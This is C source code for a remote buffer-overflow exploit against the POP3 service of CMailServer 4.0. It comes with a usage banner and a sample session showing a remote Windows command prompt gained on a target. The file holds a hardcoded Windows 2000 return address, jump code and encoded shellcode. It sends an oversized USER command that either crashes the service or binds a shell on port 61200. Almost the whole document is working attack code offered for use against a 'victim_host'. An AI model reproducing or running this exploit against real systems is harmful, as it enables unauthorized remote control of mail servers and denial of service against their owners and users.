/*
   Remote exploit for Pop3 service CMailServer v4.0
	       by m00 security [www.m00.ru]

    Advistory by Dennis Rand der[at]infowarfare.dk


	Coded by Over_G           overg[at]mail.ru

	  You may change 2 type: DOS or Portbind
								
		  1) Denial of service				
		  2) Bind shell on port 61200			
								
	 Tested only on Windows 2000 SP3 English


		       Good luck ;)



 D:\CMAIL exploit\Release>cmail40spl 192.168.0.3 -s

 [+] Resolving hostname...  OK
 [+] Connecting...  OK	
 [+] Sending exploit buffer... OK.

 [+] Use telnet for connect to 192.168.0.3:61200	

 D:\CMAIL exploit\Release>telnet 192.168.0.3 61200

 Microsoft Windows 2000 [Version 5.00.2195]
 (C) Copyright 1985-2000 Microsoft Corp.

 C:\Program Files\CMailServer>

								*/

#include <winsock.h>
#include <windows.h>
#include <stdio.h>

#pragma comment (lib,"ws2_32")


char ret_addr[] = "\xC5\xAF\xE2\x77";  //  0x77e2afc5
/* 0x77e2afc5  - RET - Windows 2000 SP3 English		 	Change other if u need */

char jmpcode[] = "\x8B\xC4\x66\x05\xC6\x28\xC1\xC8\x08\xFE\xc4\xc1\xc0\x08\xFF\xE0";

char shlcod[] = "\x83\xC0\x1e\x33\xC9\x66\xB9\xD1\x01\x80\x30\x96\x40\xE2\xFA\x15"
"\x7A\xA2\x1D\x62\x7E\xD1\x97\x96\x96\x1F\x90\x69\xA0\xFE\x18\xD8\x98\x7A\x7E\xF7"
"\x97\x96\x96\x1F\xD0\x9E\x69\xA0\xFE\x3B\x4F\x93\x58\x7E\xC4\x97\x96\x96\x1F\xD0"
"\x9A\xFE\xFA\xFA\x96\x96\xFE\xA5\xA4\xB8\xF2\xFE\xE1\xE5\xA4\xC9\xC2\x69\xC0\x9E"
"\x1F\xD0\x92\x69\xA0\xFE\xE4\x68\x25\x80\x7E\xBB\x97\x96\x96\x1F\xD0\x86\x69\xA0"
"\xFE\xE8\x4E\x74\xE5\x7E\x88\x97\x96\x96\x1F\xD0\x82\x69\xE0\x92\xFE\x5D\x7B\x6A"
"\xAD\x7E\x98\x97\x96\x96\x1F\xD0\x8E\x69\xE0\x92\xFE\x4F\x9F\x63\x3B\x7E\x68\x96"
"\x96\x96\x1F\xD0\x8A\x69\xE0\x92\xFE\x32\x8C\xE6\x51\x7E\x78\x96\x96\x96\x1F\xD0"
"\xB6\x69\xE0\x92\xFE\x32\x3B\xB8\x7F\x7E\x48\x96\x96\x96\x1F\xD0\xB2\x69\xE0\x92"
"\xFE\x73\xDF\x10\xDF\x7E\x58\x96\x96\x96\x1F\xD0\xBE\x69\xE0\x92\xFE\x71\xEF\x50"
"\xEF\x7E\x28\x96\x96\x96\x1F\xD0\xBA\xA5\x69\x17\x7A\x06\x97\x96\x96\xC2\xFE\x97"
"\x97\x96\x96\x69\xC0\x8E\xC6\xC6\xC6\xC6\xD6\xC6\xD6\xC6\x69\xC0\x8A\x1D\x4E\xC1"
"\xC1\xFE\x94\x96\x79\x86\x1D\x5A\xFC\x80\xC7\xC5\x69\xC0\xB6\xC1\xC5\x69\xC0\xB2"
"\xC1\xC7\xC5\x69\xC0\xBE\x1D\x46\xFE\xF3\xEE\xF3\x96\xFE\xF5\xFB\xF2\xB8\x1F\xF0"
"\xA6\x15\x7A\xC2\x1B\xAA\xB2\xA5\x56\xA5\x5F\x15\x57\x83\x3D\x74\x6B\x50\xD2\xB2"
"\x86\xD2\x68\xD2\xB2\xAB\x1F\xC2\xB2\xDE\x1F\xC2\xB2\xDA\x1F\xC2\xB2\xC6\x1B\xD2"
"\xB2\x86\xC2\xC6\xC7\xC7\xC7\xFC\x97\xC7\xC7\x69\xE0\xA6\xC7\x69\xC0\x86\x1D\x5A"
"\xFC\x69\x69\xA7\x06\x06\x06\x1D\x5E\xC1\x69\xC0\xBA\x69\xC0\x82\xC3\xC0\xF2\x37"
"\xA6\x96\x96\x96\x13\x56\xEE\x9A\x1D\xD6\x9A\x1D\xE6\x8A\x3B\x1D\xFE\x9E\x7D\x9F"
"\x1D\xD6\xA2\x1D\x3E\x2E\x96\x96\x96\x1D\x53\xC8\xCB\x54\x92\x96\xC5\xC3\xC0\xC1"
"\x1D\xFA\xB2\x8E\x1D\xD3\xAA\x1D\xC2\x93\xEE\x95\x43\x1D\xDC\x8E\x1D\xCC\xB6\x95"
"\x4B\x75\xA4\xDF\x1D\xA2\x1D\x95\x63\xA5\x69\x6A\xA5\x56\x3A\xAC\x52\xE2\x91\x57"
"\x59\x9B\x95\x6E\x7D\x64\xAD\xEA\xB2\x82\xE3\x77\x1D\xCC\xB2\x95\x4B\xF0\x1D\x9A"
"\xDD\x1D\xCC\x8A\x95\x4B\x1D\x92\x1D\x95\x53\x7D\x94\xA5\x56\x1D\x43\xC9\xC8\xCB"
"\xCD\x54\x92\x96";



int main(int argc, char *argv[])
{
	WSADATA wsaData;
	WORD wVersionRequested;
	struct hostent *MyTarget;
	struct sockaddr_in sock;
	SOCKET s; int i;
	char *targetip,*typ;
	char buffer[2101];

	printf("\nRemote exploit for CMailServer 4.0.2003.03.30 by m00 security / Over G\n");
	printf("	         www.m00.ru 	  overg[at]mail.ru\n\n");
	
	if (argc < 3) { 
		printf("Usage: %s <victim_host> <type>\n",argv[0]);
		printf("type:\n -d DoS attack\n -s Bind shell on port 61200\n\n");
		return 0;
	}

	targetip = argv[1];
	typ = argv[2];
	for(i = 0; i < 2100; i++) buffer[i] = 0x90;
	memcpy(&buffer[0], "USER ", 5);

	if (strstr(typ,"-s")) {
		memcpy(&buffer[515],ret_addr,strlen(ret_addr));
		memcpy(&buffer[519],jmpcode,strlen(jmpcode));
		memcpy(&buffer[519+strlen(jmpcode)+870],shlcod,strlen(shlcod));
	}

	wVersionRequested = MAKEWORD(1, 1);
	if (WSAStartup(wVersionRequested, &wsaData) < 0) return -1;

	s = socket(AF_INET, SOCK_STREAM, 0);
	if(s==INVALID_SOCKET)
	{
		printf("Socket error!\r\n");
		exit(1);
	}

	printf("[+] Resolving hostname... ");
	if ((MyTarget = gethostbyname(targetip)) == NULL)
	{
		printf("FAILED :( \n");
		exit(1);
	}

	printf(" OK \n");

	memcpy(&sock.sin_addr.s_addr, MyTarget->h_addr, MyTarget->h_length);
	sock.sin_family = AF_INET;
	sock.sin_port = htons(110);

	printf("[+] Connecting... ");
	if ( (connect(s, (struct sockaddr *)&sock, sizeof (sock) )))
	{
		printf(" FAILED :( \n");
		exit(1);
	}
	printf(" OK\n");
	printf("[+] Sending exploit buffer...");
	send(s, buffer, 2100, 0);
	if (send(s, "\r\n", 2, 0) == -1)
	{
		printf(" FAILED :( \n");
		closesocket(s);
		exit(1);
	}
	Sleep(100);
	printf(" OK. \n\n[+] Use telnet for connect to %s:61200\n\n",argv[1]);
	closesocket(s);
return 0;
}
